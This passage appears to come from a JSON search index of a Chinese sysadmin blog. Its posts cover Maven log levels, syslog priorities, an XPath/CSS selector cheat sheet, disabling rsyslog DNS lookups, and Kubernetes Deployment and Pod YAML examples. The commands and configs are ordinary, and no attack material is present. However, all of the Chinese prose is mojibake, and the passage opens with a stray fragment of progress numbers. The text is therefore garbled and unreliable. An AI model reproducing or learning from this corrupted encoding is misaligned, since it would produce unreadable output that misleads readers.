1620026/21969 KB 1720028/21969 KB 1820030/21969 KB 1920032/21969 KB 2020034/21969 KB 2120036/21969 KB 2220038/21969 KB 2320040/21969 KB 2420042/21969 KB 2520044/21969 KB 26...... é•¿åº¦æ— æ¯”é•¿ï¼Œåƒåœ¾ä¸œè¥¿ã€‚å¦‚ä½•å°†ä¹‹å±è”½å‘¢ï¼Ÿ\né¦–å…ˆå»ä¿®æ”¹mvnçš„æ—¥å¿—çº§åˆ«ï¼Œç¼ºçœæ˜¯INFOï¼Œæé«˜åˆ°WARNï¼š\n1MAVEN_OPTS=-Dorg.slf4j.simpleLogger.defaultLogLevel=warn mvn -ff clean install æˆ‘å»ï¼ŒINFOæ˜¯éƒ½æ²¡äº†ï¼Œä½†æ˜¯è¿™ä¸ªå±…ç„¶è¿˜åœ¨ï¼ï¼ï¼ï¼\næŸ¥äº†ä¸‹javaçš„æ—¥å¿—ä¼˜å…ˆçº§ï¼š\n1ALL \u0026lt; DEBUG \u0026lt; INFO \u0026lt; WARN \u0026lt; ERROR \u0026lt; FATAL \u0026lt; OFF ä¸Šé¢åªæœ‰FATALå’ŒOFFäº†ï¼Œè¯´æ˜è¿™ä¸ªæ˜¯ä¸ªå‰¯äº§å“ï¼Œä¸æ˜¯mvnæ§åˆ¶çš„ï¼Œè€Œæ˜¯ä¸Šä¼ çš„æ—¶å€™äº§ç”Ÿçš„ã€‚\næ²¡åŠæ³•äº†ï¼Œç¥­å‡ºshellå¤§æ³•ï¼š\n1mvn -ff clean install | egrep \u0026#34;(^\\[INFO\\])\u0026#34; æŠŠå¼€å¤´æ˜¯[INFO]çš„æ˜¾ç¤ºå‡ºæ¥ï¼Œå¦‚æœä¸å¤Ÿï¼Œè¿˜å¯ä»¥åŠ ä¸Š[DEBUG]\n1mvn -ff clean install | egrep \u0026#34;(^\\[INFO\\]|^\\[DEBUG\\])\u0026#34; å¦‚æœè¦å–åï¼Œä¸æ˜¾ç¤ºä»¥[INFO]å’Œ[DEBUG]æ‰“å¤´çš„é‚£äº›è¡Œï¼š\n1mvn -ff clean install | egrep -v \u0026#34;(^\\[INFO\\]|^\\[DEBUG\\])\u0026#34; æœ€åï¼Œmvnå…¨é™é»˜ï¼Œåªæœ‰å‡ºé”™æ‰æ˜¾ç¤ºçš„æ–¹å¼ï¼š\n1mvn -ff -q clean install è¿™ä¸‹ä¸–ç•Œéƒ½å®‰é™äº†ã€‚\nå†è¯´ä¸€ä¸‹ mvn build å‚æ•°çš„è°ƒè¯•ï¼š\nmvnçš„parent pomé‡Œé¢æŒ‡å®šäº†local file repo\n1 \u0026lt;repositories\u0026gt; 2 \u0026lt;repository\u0026gt; 3 \u0026lt;id\u0026gt;project.local\u0026lt;/id\u0026gt; 4 \u0026lt;name\u0026gt;project\u0026lt;/name\u0026gt; 5 \u0026lt;url\u0026gt;file://${project.basedir}/../repo\u0026lt;/url\u0026gt; 6 \u0026lt;/repository\u0026gt; 7 \u0026lt;/repositories\u0026gt; è€Œä¸”æŒ‡å®šäº†-s setting.xmlï¼Œé‡Œé¢ä¹Ÿæœ‰artifactoryçš„repos. åœ¨å­æ¨¡å—moduleé‡Œä¸çŸ¥é“æ˜¯å¦æ­£å¸¸è·å¾—äº†ã€‚\næ‰§è¡Œä¸‹é¢å‘½ä»¤å°±å¯ä»¥äº†ï¼š\n1mvn help:evaluate 2${project.repositories} ","date":"2024-01-23","img":"","permalink":"https://rendoumi.com/posts/20240123-mvn_build_log/","series":null,"tags":null,"title":"Mvn Buildçš„æ—¶å€™æ§åˆ¶æ—¥å¿—è¾“å‡º"},{"categories":null,"content":"é¦–å…ˆæ˜¯ï¼š\n[facility].[priority]\nfacilityè¡¨ç¤ºè®¾å¤‡ã€è®¾æ–½ï¼Œç‰¹åˆ«è£…ç½®ï¼š\n1auth # è®¤è¯ç›¸å…³çš„ 2authpriv # æƒé™,æˆæƒç›¸å…³çš„ 3cron # ä»»åŠ¡è®¡åˆ’ç›¸å…³çš„ 4daemon # å®ˆæŠ¤è¿›ç¨‹ç›¸å…³çš„ 5kern # å†…æ ¸ç›¸å…³çš„ 6lpr # æ‰“å°ç›¸å…³çš„ 7mail # é‚®ä»¶ç›¸å…³çš„ 8mark # æ ‡è®°ç›¸å…³çš„ 9news # æ–°é—»ç›¸å…³çš„ 10security # å®‰å…¨ç›¸å…³çš„,ä¸auth ç±»ä¼¼ 11syslog # syslogè‡ªå·±çš„ 12user # ç”¨æˆ·ç›¸å…³çš„ 13uucp # unix to unix cp ç›¸å…³çš„ 14local0 åˆ° local7 # ç”¨æˆ·è‡ªå®šä¹‰ä½¿ç”¨ 15* # *è¡¨ç¤ºæ‰€æœ‰çš„facility ä¸€å®šè¦æ³¨æ„ä¸Šé¢çš„ï¼Œlocal0 åˆ° local7 # ç”¨æˆ·è‡ªå®šä¹‰ä½¿ç”¨\npriorityè¡¨ç¤ºä¼˜å…ˆæƒï¼Œæ—¥å¿—ä¼˜å…ˆæƒ(log level),ä¸€èˆ¬æœ‰ä»¥ä¸‹å‡ ç§ä¼˜å…ˆæƒ(ä»ä½åˆ°é«˜)ï¼š\n1debug # ç¨‹åºæˆ–ç³»ç»Ÿçš„è°ƒè¯•ä¿¡æ¯ 2info # ä¸€èˆ¬ä¿¡æ¯, 3notice # ä¸å½±å“æ­£å¸¸åŠŸèƒ½,éœ€è¦æ³¨æ„çš„æ¶ˆæ¯ 4warning/warn # å¯èƒ½å½±å“ç³»ç»ŸåŠŸèƒ½,éœ€è¦æé†’ç”¨æˆ·çš„é‡è¦äº‹ä»¶ 5err/error # é”™è¯¯ä¿¡æ¯ 6crit # æ¯”è¾ƒä¸¥é‡çš„ 7alert # å¿…é¡»é©¬ä¸Šå¤„ç†çš„ 8emerg/oanic # ä¼šå¯¼è‡´ç³»ç»Ÿä¸å¯ç”¨çš„ 9* # è¡¨ç¤ºæ‰€æœ‰çš„æ—¥å¿—çº§åˆ« 10none # è·Ÿ* ç›¸å,è¡¨ç¤ºå•¥ä¹Ÿæ²¡æœ‰ syslogçš„æ—¥å¿—ä¼˜å…ˆæƒé»˜è®¤æ˜¯infoï¼Œè¿™æ—¶å€™ç”¨syslogä¸ºdebug(æœ€ä½æ—¥å¿—ä¼˜å…ˆæƒ)æ¥å†™æ—¥å¿—ï¼ŒsyslogæœåŠ¡æ˜¯ä¸ä¼šå†™å…¥æ—¥å¿—çš„ã€‚\n","date":"2024-01-23","img":"","permalink":"https://rendoumi.com/posts/20240123-syslog_priority/","series":null,"tags":null,"title":"Syslogçº§åˆ«è¯¦è§£"},{"categories":null,"content":"æœ€è¿‘åœ¨æpuppeteerçš„è‡ªåŠ¨åŒ–ï¼Œæœ‰å¾ˆå¤šåœ°æ–¹éœ€è¦ç”¨åˆ°CSS Selectorï¼Œä½†æ˜¯æŸäº›åœ°æ–¹åˆæ˜¯ç”¨Xpathæ–¹ä¾¿ï¼Œé‡‘æ‰‹æŒ‡æ”¾ä¸€ä¸‹ï¼Œå¤‡æŸ¥ï¼š\nTest queries in the Xpath test bed: Xpath test bed (whitebeam.org) Browser console 1$x(\u0026#34;//div\u0026#34;) Works in Firefox and Chrome.\n# Selectors Descendant selectors h1 //h1 div p `//div//p ul \u0026gt; li `//ul/li ul \u0026gt; li \u0026gt; a //ul/li/a div \u0026gt; * //div/* :root `/ :root \u0026gt; body /body Attribute selectors #id //*[@id=\u0026quot;id\u0026quot;] .class //*[@class=\u0026quot;class\u0026quot;] â€¦kinda input[type=\u0026quot;submit\u0026quot;] //input[@type=\u0026quot;submit\u0026quot;] a#abc[for=\u0026quot;xyz\u0026quot;] `//a[@id=\u0026ldquo;abc\u0026rdquo;][@for=\u0026ldquo;xyz\u0026rdquo;] a[rel] //a[@rel] a[href^='/'] `//a[starts-with(@href, \u0026lsquo;/\u0026rsquo;)] a[href$='pdf'] //a[ends-with(@href, '.pdf')] a[href*='://'] //a[contains(@href, '://')] a[rel~='help'] //a[contains(@rel, 'help')] â€¦kinda Order selectors ul \u0026gt; li:first-of-type `//ul/li[1] ul \u0026gt; li:nth-of-type(2) //ul/li[2] ul \u0026gt; li:last-of-type //ul/li[last()] li#id:first-of-type `//li[1][@id=\u0026ldquo;id\u0026rdquo;] a:first-child //*[1][name()=\u0026quot;a\u0026quot;] a:last-child //*[last()][name()=\u0026quot;a\u0026quot;] Siblings h1 ~ ul `//h1/following-sibling::ul h1 + ul //h1/following-sibling::ul[1] h1 ~ #id //h1/following-sibling::[@id=\u0026quot;id\u0026quot;] jQuery $('ul \u0026gt; li').parent() `//ul/li/.. $('li').closest('section') //li/ancestor-or-self::section $('a').attr('href') `//a/@href $('span').text() //span/text() Other things h1:not([id]) `//h1[not(@id)] Text match `//button[text()=\u0026ldquo;Submit\u0026rdquo;] Text match (substring) //button[contains(text(),\u0026quot;Go\u0026quot;)] Arithmetic //product[@price \u0026gt; 2.50] Has children //ul[*] Has children (specific) //ul[li] Or logic `//a[@name or @href] Union (joins results) `//a | //div Class check 1//div[contains(concat(\u0026#39; \u0026#39;,normalize-space(@class),\u0026#39; \u0026#39;),\u0026#39; foobar \u0026#39;)] Xpath doesnâ€™t have the â€œcheck if part of space-separated listâ€ operator, so this is the workaround (source ).\n# Expressions Steps and axes // ul / a[@id='link'] Axis Step Axis Step Prefixes Prefix Example What // //hr[@class='edge'] Anywhere ./ ./a Relative / /html/body/div Root Begin your expression with any of these.\nAxes Axis Example What / //ul/li/a Child // //[@id=\u0026quot;list\u0026quot;]//a Descendant Separate your steps with /. Use two (//) if you donâ€™t want to select direct children.\nSteps 1//div 2//div[@name=\u0026#39;box\u0026#39;] 3//[@id=\u0026#39;link\u0026#39;] A step may have an element name (div) and predicates ([...]). Both are optional. They can also be these other things:\n1//a/text() #=\u0026gt; \u0026#34;Go home\u0026#34; 2//a/@href #=\u0026gt; \u0026#34;index.html\u0026#34; 3//a/* #=\u0026gt; All a\u0026#39;s child elements # Predicates Predicates 1//div[true()] 2//div[@class=\u0026#34;head\u0026#34;] 3//div[@class=\u0026#34;head\u0026#34;][@id=\u0026#34;top\u0026#34;] Restricts a nodeset only if some condition is true. They can be chained.\nOperators 1# Comparison 2//a[@id = \u0026#34;xyz\u0026#34;] 3//a[@id != \u0026#34;xyz\u0026#34;] 4//a[@price \u0026gt; 25] 5# Logic (and/or) 6//div[@id=\u0026#34;head\u0026#34; and position()=2] 7//div[(x and y) or not(z)] Use comparison and logic operators to make conditionals.\nUsing nodes 1# Use them inside functions 2//ul[count(li) \u0026gt; 2] 3//ul[count(li[@class=\u0026#39;hide\u0026#39;]) \u0026gt; 0] 4# This returns `\u0026lt;ul\u0026gt;` that has a `\u0026lt;li\u0026gt;` child 5//ul[li] You can use nodes inside predicates.\nIndexing 1//a[1] # first \u0026lt;a\u0026gt; 2//a[last()] # last \u0026lt;a\u0026gt; 3//ol/li[2] # second \u0026lt;li\u0026gt; 4//ol/li[position()=2] # same as above 5//ol/li[position()\u0026gt;1] # :not(:first-of-type) Use [] with a number, or last() or position().\nChaining order 1a[1][@href=\u0026#39;/\u0026#39;] 2a[@href=\u0026#39;/\u0026#39;][1] Order is significant, these two are different.\nNesting predicates 1//section[.//h1[@id=\u0026#39;hi\u0026#39;]] This returns \u0026lt;section\u0026gt; if it has an \u0026lt;h1\u0026gt; descendant with id='hi'.\n# Functions Node functions 1name() # //[starts-with(name(), \u0026#39;h\u0026#39;)] 2text() # //button[text()=\u0026#34;Submit\u0026#34;] 3 # //button/text() 4lang(str) 5namespace-uri() 6count() # //table[count(tr)=1] 7position() # //ol/li[position()=2] Boolean functions 1not(expr) # button[not(starts-with(text(),\u0026#34;Submit\u0026#34;))] String functions 1contains() # font[contains(@class,\u0026#34;head\u0026#34;)] 2starts-with() # font[starts-with(@class,\u0026#34;head\u0026#34;)] 3ends-with() # font[ends-with(@class,\u0026#34;head\u0026#34;)] 4concat(x,y) 5substring(str, start, len) 6substring-before(\u0026#34;01/02\u0026#34;, \u0026#34;/\u0026#34;) #=\u0026gt; 01 7substring-after(\u0026#34;01/02\u0026#34;, \u0026#34;/\u0026#34;) #=\u0026gt; 02 8translate() 9normalize-space() 10string-length() Type conversion 1string() 2number() 3boolean() # Axes Using axes 1//ul/li # ul \u0026gt; li 2//ul/child::li # ul \u0026gt; li (same) 3//ul/following-sibling::li # ul ~ li 4//ul/descendant-or-self::li # ul li 5//ul/ancestor-or-self::li # $(\u0026#39;ul\u0026#39;).closest(\u0026#39;li\u0026#39;) Steps of an expression are separated by /, usually used to pick child nodes. Thatâ€™s not always true: you can specify a different â€œaxisâ€ with ::.\n// ul /child:: li Axis Step Axis Step Child axis 1# both the same 2//ul/li/a 3//child::ul/child::li/child::a child:: is the default axis. This makes //a/b/c work.\n1# both the same 2# this works because `child::li` is truthy, so the predicate succeeds 3//ul[li] 4//ul[child::li] 5# both the same 6//ul[count(li) \u0026gt; 2] 7//ul[count(child::li) \u0026gt; 2] Descendant-or-self axis 1# both the same 2//div//h4 3//div/descendant-or-self::h4 // is short for the descendant-or-self:: axis.\n1# both the same 2//ul//[last()] 3//ul/descendant-or-self::[last()] Other axes Axis Abbrev Notes ancestor ancestor-or-self attribute @ @href is short for attribute::href child div is short for child::div descendant descendant-or-self // // is short for /descendant-or-self::node()/ namespace self . . is short for self::node() parent .. .. is short for parent::node() following following-sibling preceding preceding-sibling There are other axes you can use.\nUnions 1//a | //span Use | to join two expressions.\n# More examples Examples 1//* # all elements 2count(//*) # count all elements 3(//h1)[1]/text() # text of the first h1 heading 4//li[span] # find a \u0026lt;li\u0026gt; with an \u0026lt;span\u0026gt; inside it 5 # ...expands to //li[child::span] 6//ul/li/.. # use .. to select a parent Find a parent 1//section[h1[@id=\u0026#39;section-name\u0026#39;]] Finds a \u0026lt;section\u0026gt; that directly contains h1#section-name\n1//section[//h1[@id=\u0026#39;section-name\u0026#39;]] Finds a \u0026lt;section\u0026gt; that contains h1#section-name. (Same as above, but uses descendant-or-self instead of child)\nClosest 1./ancestor-or-self::[@class=\u0026#34;box\u0026#34;] Works like jQueryâ€™s $().closest('.box').\nAttributes 1//item[@price \u0026gt; 2*@discount] Finds \u0026lt;item\u0026gt; and check its attributes\n# References Xpath test bed (whitebeam.org) ","date":"2024-01-22","img":"","permalink":"https://rendoumi.com/posts/20240122-xpath_css_selector/","series":null,"tags":null,"title":"Xpathé‡‘æ‰‹æŒ‡"},{"categories":null,"content":"ç½‘ç®¡æ£€æŸ¥æµé‡å›¾çš„æ—¶å€™å‘ç°ï¼Œudpçš„æµé‡å¾ˆå¤š\nçœ‹äº†çœ‹æ—¥å¿—ï¼š\n1Jun 28 00:39:28 172.16.0.1 %ASA-6-305011: Built dynamic UDP translation from inside:172.16.36.2/2160 to outside:124.243.230.6/2160 2Jun 28 00:39:28 172.16.0.1 %ASA-6-302015: Built outbound UDP connection 1369422617 for outside:223.5.5.5/53 (223.5.5.5/53) to inside:172.1... å‘ç°ä¸€å¤§å †æ˜¯æŸ¥è¯¢dns 53çš„\næ€äº†æ— å…³è¿›ç¨‹ï¼Œç»§ç»­ï¼Œè¿˜æœ‰æ˜¯é‚£ä¹ˆå¤šçš„udp 53 dnsæŸ¥è¯¢\næŸ¥äº†åŠå¤©æ‰å‘ç°ï¼Œæ˜¯rsyslogè®°å½•æ—¥å¿—çš„æ—¶å€™åæŸ¥ipçš„åŸŸåå¯¼è‡´çš„ï¼Œç”±äºæ˜¯å†…ç½‘åŸŸåéƒ½ä¸å¯¹ï¼Œæ‰€ä»¥ipæŸ¥ä¸åˆ°ï¼Œå°±ä¸åœçš„å¾€å…¬ç½‘dnså‘æŸ¥è¯¢ï¼Œå¯¼è‡´udpæµé‡æ¿€å¢ã€‚\nçŸ¥é“åŸå› å°±çŸ¥é“å¦‚ä½•è§£å†³äº†\nCentosä¸‹ï¼Œrsyslogå¢åŠ -x -Qç¦æ­¢è§£æçš„å‚æ•°ï¼š\n1vi /etc/sysconfig/rsyslog 2# Options for rsyslogd 3# Syslogd options are deprecated since rsyslog v3. 4# If you want to use them, switch to compatibility mode 2 by \u0026#34;-c 2\u0026#34; 5# See rsyslogd(8) for more details 6SYSLOGD_OPTIONS=\u0026#34;-c 5 -x -Q\u0026#34; Ubuntuä¸‹ï¼Œæ–¹æ³•ä¸€æ ·ï¼Œæ–‡ä»¶ä¸ä¸€æ ·\n1vi /etc/defaults/rsyslog 2RSYSLOGD_OPTIONS=\u0026#34;-x -Q\u0026#34; ç„¶åé‡å¯å°±å¯ä»¥äº†ã€‚\n","date":"2024-01-21","img":"","permalink":"https://rendoumi.com/posts/20240121-rsyslog_dns/","series":null,"tags":null,"title":"ç¦æ‰Rsyslogçš„dnsè§£æ"},{"categories":null,"content":"javaä¸šåŠ¡ä¸Šk8sçš„è¯ï¼Œçœ‹åˆ°ä¸€ç¯‡æ¯”è¾ƒå¥½çš„æ–‡ç« ï¼Œè¦æ³¨æ„çš„åœ°æ–¹ï¼š\n1apiVersion: apps/v1 2kind: Deployment 3metadata: 4 name: java-web 5 namespace: ops 6 labels: 7 app: java-web 8spec: 9 selector: 10 matchLabels: 11 app: java-web 12 replicas: 2 13 strategy: 14 type: RollingUpdate 15 template: 16 metadata: 17 name: java-web 18 annotations: # ç¬¬ä¸€ç‚¹ï¼šæ–°å¢æ³¨è§£ 19 loki.io/scrape: \u0026#39;true\u0026#39; # æŠ“å–ç›´æ¥è¾“å‡ºçš„æ—¥å¿—åˆ°lokié‡Œ 20 prometheus.io/path: /metrics #é‡‡é›†çš„ç›‘æ§åœ°å€ 21 prometheus.io/port: \u0026#39;2112\u0026#39; #é‡‡é›†æš´éœ²çš„ç›‘æ§ç«¯å£ 22 prometheus.io/scrape: \u0026#39;true\u0026#39; #æ‰“å¼€é‡‡é›†å¼€å…³ 23 labels: 24 app: java-web 25 spec: 26 imagePullSecrets: # ç¬¬äºŒç‚¹ï¼šæ·»åŠ æƒé™ 27 - name: my-docker #åªæœ‰è¯¥ç”¨æˆ·æ‰æœ‰pullé•œåƒçš„æƒé™ 28 containers: 29 - name: java-web 30 image: hb.ops.top/ops/java-web:5917f92c 31 imagePullPolicy: IfNotPresent 32 readinessProbe: # ç¬¬ä¸‰ç‚¹ï¼šæ–°å¢å­˜æ´»æ£€æµ‹ï¼Œå½“å‰æ˜¯é’ˆå¯¹ç›‘æ§ç«¯å£è¿›è¡Œå­˜æ´»æ£€æµ‹ï¼Œä¹Ÿå°±æ˜¯è¯´åªæœ‰å½“ç›‘æ§ç«¯å£èµ·æ¥äº†ï¼Œç¨‹åºæ‰ç®—å®Œå…¨å¯åŠ¨ 33 httpGet: 34 port: 2112 35 path: /metrics/prometheus 36 initialDelaySeconds: 60 37 successThreshold: 1 38 failureThreshold: 3 39 timeoutSeconds: 5 40 startupProbe: 41 httpGet: 42 port: 2112 43 path: /metrics/prometheus 44 initialDelaySeconds: 60 45 successThreshold: 1 46 failureThreshold: 3 47 timeoutSeconds: 5 48 livenessProbe: 49 httpGet: 50 port: 2112 51 path: /metrics/prometheus 52 initialDelaySeconds: 60 53 successThreshold: 1 54 failureThreshold: 3 55 timeoutSeconds: 5 56 resources: # ç¬¬å››ç‚¹ï¼šè®¾ç½®èµ„æºé™åˆ¶ï¼Œå¦‚æœæ˜¯javaç¨‹åºï¼Œå»ºè®®limitæ¯”requestå¤§ï¼Œè¿™æ ·å¯ä»¥åˆç†åˆ†é…å †å†…å­˜å’Œéå †å†…å­˜ 57 requests: 58 memory: 1024Mi 59 limits: 60 memory: 2048Mi 61 ports: 62 - name: web-port 63 containerPort: 8889 64 env: # ç¬¬äº”ç‚¹ï¼šè®¾ç½®ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥è®¾ç½®æ—¶åŒºï¼ŒæŒ‡å®šEVNç¯å¢ƒï¼Œæ·»åŠ JAVAå‚æ•°ç­‰ 65 - name: JVM_OPTS 66 value: -javaagent:/opt/skywalking/skywalking-agent.jar -Xmx1G -Xms1G 67 - name: TZ 68 value: Asia/Shanghai 69 - name: APOLLO_LABEL 70 value: gray 71 - name: SW_AGENT_NAME 72 value: \u0026#39;k8s-java-web\u0026#39; 73 - name: SW_AGENT_COLLECTOR_BACKEND_SERVICES 74 value: \u0026#39;10.0.0.123:11800\u0026#39; 75 - name: ENV 76 value: prod 77 78--- 79 80apiVersion: v1 81kind: Service 82metadata: 83 labels: 84 app: java-web 85 name: java-web 86 namespace: ops 87spec: 88 ports: 89 - name: java-web-port 90 port: 8889 91 protocol: TCP 92 targetPort: 8889 93 nodePort: 30009 94 selector: 95 app: java-web 96 sessionAffinity: None 97 type: NodePort 98status: 99 loadBalancer: {} ä¸Šé¢å¿½ç•¥äº†å¯åŠ¨å‘½ä»¤ï¼Œå…¶å®å®¹å™¨å†…çš„å¯åŠ¨å‘½ä»¤ä¹Ÿæ˜¯å¾ˆæœ‰å­¦é—®çš„ã€‚\n","date":"2024-01-19","img":"","permalink":"https://rendoumi.com/posts/20240119-k8s_java/","series":null,"tags":null,"title":"Javaä¸šåŠ¡ä¸Škubernetesçš„æ³¨æ„ç‚¹"},{"categories":null,"content":"Podçš„yamlæ–‡ä»¶çš„èµ„æºæ¸…å•å’Œè§£é‡Šï¼Œå¤‡æŸ¥ 1apiVersion: v1 #å¿…é€‰ï¼Œç‰ˆæœ¬å·ï¼Œä¾‹å¦‚v1 2kind: Pod #å¿…é€‰ï¼Œèµ„æºç±»å‹ï¼Œä¾‹å¦‚ Pod 3metadata: #å¿…é€‰ï¼Œå…ƒæ•°æ® 4 name: string #å¿…é€‰ï¼ŒPodåç§° 5 namespace: string #Podæ‰€å±çš„å‘½åç©ºé—´,é»˜è®¤ä¸º\u0026#34;default\u0026#34; 6 labels: #è‡ªå®šä¹‰æ ‡ç­¾åˆ—è¡¨ 7 - name: string 8spec: #å¿…é€‰ï¼ŒPodä¸­å®¹å™¨çš„è¯¦ç»†å®šä¹‰ 9 containers: #å¿…é€‰ï¼ŒPodä¸­å®¹å™¨åˆ—è¡¨ 10 - name: string #å¿…é€‰ï¼Œå®¹å™¨åç§° 11 image: string #å¿…é€‰ï¼Œå®¹å™¨çš„é•œåƒåç§° 12 imagePullPolicy: [ Always|Never|IfNotPresent ] #è·å–é•œåƒçš„ç­–ç•¥ 13 command: [string] #å®¹å™¨çš„å¯åŠ¨å‘½ä»¤åˆ—è¡¨ï¼Œå¦‚ä¸æŒ‡å®šï¼Œä½¿ç”¨æ‰“åŒ…æ—¶ä½¿ç”¨çš„å¯åŠ¨å‘½ä»¤ 14 args: [string] #å®¹å™¨çš„å¯åŠ¨å‘½ä»¤å‚æ•°åˆ—è¡¨ 15 workingDir: string #å®¹å™¨çš„å·¥ä½œç›®å½• 16 volumeMounts: #æŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨çš„å­˜å‚¨å·é…ç½® 17 - name: string #å¼•ç”¨podå®šä¹‰çš„å…±äº«å­˜å‚¨å·çš„åç§°ï¼Œéœ€ç”¨volumes[]éƒ¨åˆ†å®šä¹‰çš„çš„å·å 18 mountPath: string #å­˜å‚¨å·åœ¨å®¹å™¨å†…mountçš„ç»å¯¹è·¯å¾„ï¼Œåº”å°‘äº512å­—ç¬¦ 19 readOnly: boolean #æ˜¯å¦ä¸ºåªè¯»æ¨¡å¼ 20 ports: #éœ€è¦æš´éœ²çš„ç«¯å£åº“å·åˆ—è¡¨ 21 - name: string #ç«¯å£çš„åç§° 22 containerPort: int #å®¹å™¨éœ€è¦ç›‘å¬çš„ç«¯å£å· 23 hostPort: int #å®¹å™¨æ‰€åœ¨ä¸»æœºéœ€è¦ç›‘å¬çš„ç«¯å£å·ï¼Œé»˜è®¤ä¸Containerç›¸åŒ 24 protocol: string #ç«¯å£åè®®ï¼Œæ”¯æŒTCPå’ŒUDPï¼Œé»˜è®¤TCP 25 env: #å®¹å™¨è¿è¡Œå‰éœ€è®¾ç½®çš„ç¯å¢ƒå˜é‡åˆ—è¡¨ 26 - name: string #ç¯å¢ƒå˜é‡åç§° 27 value: string #ç¯å¢ƒå˜é‡çš„å€¼ 28 resources: #èµ„æºé™åˆ¶å’Œè¯·æ±‚çš„è®¾ç½® 29 limits: #èµ„æºé™åˆ¶çš„è®¾ç½® 30 cpu: string #Cpuçš„é™åˆ¶ï¼Œå•ä½ä¸ºcoreæ•°ï¼Œå°†ç”¨äºdocker run --cpu-shareså‚æ•° 31 memory: string #å†…å­˜é™åˆ¶ï¼Œå•ä½å¯ä»¥ä¸ºMib/Gibï¼Œå°†ç”¨äºdocker run --memoryå‚æ•° 32 requests: #èµ„æºè¯·æ±‚çš„è®¾ç½® 33 cpu: string #Cpuè¯·æ±‚ï¼Œå®¹å™¨å¯åŠ¨çš„åˆå§‹å¯ç”¨æ•°é‡ 34 memory: string #å†…å­˜è¯·æ±‚,å®¹å™¨å¯åŠ¨çš„åˆå§‹å¯ç”¨æ•°é‡ 35 lifecycle: #ç”Ÿå‘½å‘¨æœŸé’©å­ 36 postStart: #å®¹å™¨å¯åŠ¨åç«‹å³æ‰§è¡Œæ­¤é’©å­,å¦‚æœæ‰§è¡Œå¤±è´¥,ä¼šæ ¹æ®é‡å¯ç­–ç•¥è¿›è¡Œé‡å¯ 37 preStop: #å®¹å™¨ç»ˆæ­¢å‰æ‰§è¡Œæ­¤é’©å­,æ— è®ºç»“æœå¦‚ä½•,å®¹å™¨éƒ½ä¼šç»ˆæ­¢ 38 livenessProbe: #å¯¹Podå†…å„å®¹å™¨å¥åº·æ£€æŸ¥çš„è®¾ç½®ï¼Œå½“æ¢æµ‹æ— å“åº”å‡ æ¬¡åå°†è‡ªåŠ¨é‡å¯è¯¥å®¹å™¨ 39 exec: #å¯¹Podå®¹å™¨å†…æ£€æŸ¥æ–¹å¼è®¾ç½®ä¸ºexecæ–¹å¼ 40 command: [string] #execæ–¹å¼éœ€è¦åˆ¶å®šçš„å‘½ä»¤æˆ–è„šæœ¬ 41 httpGet: #å¯¹Podå†…ä¸ªå®¹å™¨å¥åº·æ£€æŸ¥æ–¹æ³•è®¾ç½®ä¸ºHttpGetï¼Œéœ€è¦åˆ¶å®šPathã€port 42 path: string 43 port: number 44 host: string 45 scheme: string 46 HttpHeaders: 47 - name: string 48 value: string 49 tcpSocket: #å¯¹Podå†…ä¸ªå®¹å™¨å¥åº·æ£€æŸ¥æ–¹å¼è®¾ç½®ä¸ºtcpSocketæ–¹å¼ 50 port: number 51 initialDelaySeconds: 0 #å®¹å™¨å¯åŠ¨å®Œæˆåé¦–æ¬¡æ¢æµ‹çš„æ—¶é—´ï¼Œå•ä½ä¸ºç§’ 52 timeoutSeconds: 0 #å¯¹å®¹å™¨å¥åº·æ£€æŸ¥æ¢æµ‹ç­‰å¾…å“åº”çš„è¶…æ—¶æ—¶é—´ï¼Œå•ä½ç§’ï¼Œé»˜è®¤1ç§’ 53 periodSeconds: 0 #å¯¹å®¹å™¨ç›‘æ§æ£€æŸ¥çš„å®šæœŸæ¢æµ‹æ—¶é—´è®¾ç½®ï¼Œå•ä½ç§’ï¼Œé»˜è®¤10ç§’ä¸€æ¬¡ 54 successThreshold: 0 55 failureThreshold: 0 56 securityContext: 57 privileged: false 58 restartPolicy: [Always | Never | OnFailure] #Podçš„é‡å¯ç­–ç•¥ 59 nodeName: \u0026lt;string\u0026gt; #è®¾ç½®NodeNameè¡¨ç¤ºå°†è¯¥Podè°ƒåº¦åˆ°æŒ‡å®šåˆ°åç§°çš„nodeèŠ‚ç‚¹ä¸Š 60 nodeSelector: obeject #è®¾ç½®NodeSelectorè¡¨ç¤ºå°†è¯¥Podè°ƒåº¦åˆ°åŒ…å«è¿™ä¸ªlabelçš„nodeä¸Š 61 imagePullSecrets: #Pullé•œåƒæ—¶ä½¿ç”¨çš„secretåç§°ï¼Œä»¥keyï¼šsecretkeyæ ¼å¼æŒ‡å®š 62 - name: string 63 hostNetwork: false #æ˜¯å¦ä½¿ç”¨ä¸»æœºç½‘ç»œæ¨¡å¼ï¼Œé»˜è®¤ä¸ºfalseï¼Œå¦‚æœè®¾ç½®ä¸ºtrueï¼Œè¡¨ç¤ºä½¿ç”¨å®¿ä¸»æœºç½‘ç»œ 64 volumes: #åœ¨è¯¥podä¸Šå®šä¹‰å…±äº«å­˜å‚¨å·åˆ—è¡¨ 65 - name: string #å…±äº«å­˜å‚¨å·åç§° ï¼ˆvolumesç±»å‹æœ‰å¾ˆå¤šç§ï¼‰ 66 emptyDir: {} #ç±»å‹ä¸ºemtyDirçš„å­˜å‚¨å·ï¼Œä¸PodåŒç”Ÿå‘½å‘¨æœŸçš„ä¸€ä¸ªä¸´æ—¶ç›®å½•ã€‚ä¸ºç©ºå€¼ 67 hostPath: string #ç±»å‹ä¸ºhostPathçš„å­˜å‚¨å·ï¼Œè¡¨ç¤ºæŒ‚è½½Podæ‰€åœ¨å®¿ä¸»æœºçš„ç›®å½• 68 path: string #Podæ‰€åœ¨å®¿ä¸»æœºçš„ç›®å½•ï¼Œå°†è¢«ç”¨äºåŒæœŸä¸­mountçš„ç›®å½• 69 secret: #ç±»å‹ä¸ºsecretçš„å­˜å‚¨å·ï¼ŒæŒ‚è½½é›†ç¾¤ä¸å®šä¹‰çš„secretå¯¹è±¡åˆ°å®¹å™¨å†…éƒ¨ 70 scretname: string 71 items: 72 - key: string 73 path: string 74 configMap: #ç±»å‹ä¸ºconfigMapçš„å­˜å‚¨å·ï¼ŒæŒ‚è½½é¢„å®šä¹‰çš„configMapå¯¹è±¡åˆ°å®¹å™¨å†…éƒ¨ 75 name: string 76 items: 77 - key: string 78 path: string åœ¨kubernetesä¸­åŸºæœ¬æ‰€æœ‰èµ„æºçš„ä¸€çº§å±æ€§éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä¸»è¦åŒ…å«5éƒ¨åˆ†ï¼š\napiVersion 